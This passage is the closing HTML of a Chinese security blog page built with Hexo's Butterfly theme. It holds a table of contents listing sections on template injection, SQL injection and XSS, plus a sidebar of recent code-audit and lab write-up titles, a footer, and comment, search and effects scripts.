href="#Thymeleaf%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">Thymeleaf模版注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLInjection%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">SQLInjection安全问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4XSS"><span class="toc-number">5.</span> <span class="toc-text">文件上传导致XSS</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/7083c6a.html" title="若依CMS-4.5.1代码审计"><img src="https://www.dmoe.cc/random.php?4612" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="若依CMS-4.5.1代码审计"/></a><div class="content"><a class="title" href="/posts/7083c6a.html" title="若依CMS-4.5.1代码审计">若依CMS-4.5.1代码审计</a><time datetime="2025-06-06T05:53:59.000Z" title="发表于 2025-06-06 13:53:59">2025-06-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c0aca0e.html" title="春秋云镜-Privilege"><img src="https://www.dmoe.cc/random.php?1969" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜-Privilege"/></a><div class="content"><a class="title" href="/posts/c0aca0e.html" title="春秋云镜-Privilege">春秋云镜-Privilege</a><time datetime="2025-04-25T05:45:42.000Z" title="发表于 2025-04-25 13:45:42">2025-04-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ac5e4dda.html" title="春秋云镜-Spoofing"><img src="https://www.dmoe.cc/random.php?3583" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜-Spoofing"/></a><div class="content"><a class="title" href="/posts/ac5e4dda.html" title="春秋云镜-Spoofing">春秋云镜-Spoofing</a><time datetime="2025-04-24T05:00:21.000Z" title="发表于 2025-04-24 13:00:21">2025-04-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d66aab01.html" title="春秋云镜-Hospital"><img src="https://www.dmoe.cc/random.php?5099" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜-Hospital"/></a><div class="content"><a class="title" href="/posts/d66aab01.html" title="春秋云镜-Hospital">春秋云镜-Hospital</a><time datetime="2025-04-19T05:01:28.000Z" title="发表于 2025-04-19 13:01:28">2025-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/327fc326.html" title="春秋云镜-Initial"><img src="https://www.dmoe.cc/random.php?23" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜-Initial"/></a><div class="content"><a class="title" href="/posts/327fc326.html" title="春秋云镜-Initial">春秋云镜-Initial</a><time datetime="2025-04-17T05:36:50.000Z" title="发表于 2025-04-17 13:36:50">2025-04-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
+  const initValine = () => {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
+      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
+      avatar: 'monsterid',
+      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, null))
+  }
+
+  const loadValine = async () => {
+    if (typeof Valine === 'function') initValine()
+    else {
+      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
+      initValine()
+    }
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
